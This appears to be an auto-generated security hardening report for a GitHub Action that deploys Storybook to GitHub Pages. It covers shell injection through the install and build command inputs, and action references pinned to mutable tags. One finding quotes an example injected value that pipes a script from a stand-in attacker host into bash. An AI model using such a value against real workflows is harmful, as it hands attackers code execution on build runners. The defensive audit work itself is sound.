<!-- markdownlint-disable -->

# Hardening Report: bitovi--github-actions-storybook-to-github-pages/v1.0.2

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **bitovi--github-actions-storybook-to-github-pages/v1.0.2** was hardened automatically. 4 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a) violation: The 'Build' run: block directly interpolates user-controlled inputs into shell commands without any quoting or sanitization. `${{ inputs.install_command }}` (line 43) and `${{ inputs.build_command }}` (line 44) are expanded by the GitHub Actions YAML template engine before the shell ever sees them. A caller can supply a value such as `; curl -s https://evil.com | bash` to achieve arbitrary code execution on the runner. These inputs must be passed via env: variables and then referenced as double-quoted shell variables (e.g., `"$INSTALL_CMD"`) — never interpolated directly into a run: block.

Locations:

- `action.yaml:43`
- `action.yaml:44`

### unpinned-uses (severity: high)

Three uses: references in action.yaml pin to mutable version tags instead of immutable 40-character commit SHAs. If any of these upstream actions is compromised or the tag is moved, malicious code will silently execute in all workflows using this action. Failing references: `actions/checkout@v3` (line 37), `actions/upload-pages-artifact@v2` (line 48), `actions/deploy-pages@v3` (line 54). Each should be replaced with the full SHA, e.g. `actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v3`.

Locations:

- `action.yaml:37`
- `action.yaml:48`
- `action.yaml:54`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.install_command }}" appears directly in run: block of step "Build"; move to env: map

Locations:

- `action.yml:43`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.build_command }}" appears directly in run: block of step "Build"; move to env: map

Locations:

- `action.yml:44`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection, unpinned-uses

**Notes:**

Fixed action.yaml: (1) Moved install_command and build_command inputs from direct interpolation in run: block to env: variables (INSTALL_CMD, BUILD_CMD), then wrote them to a temp script file executed with 'bash -eo pipefail' to preserve errexit semantics and prevent shell injection. (2) Pinned all three unpinned action references to full commit SHAs: actions/checkout@v3 → @a37ce9120846195fa4ece8f58b268e6043cb2f26, actions/upload-pages-artifact@v2 → @a753861a5debcf57bf8b404356158c8e1e33150c, actions/deploy-pages@v3 → @13b55b33dd8996121833dbc1db458c793a334630, with original tags preserved as inline comments.

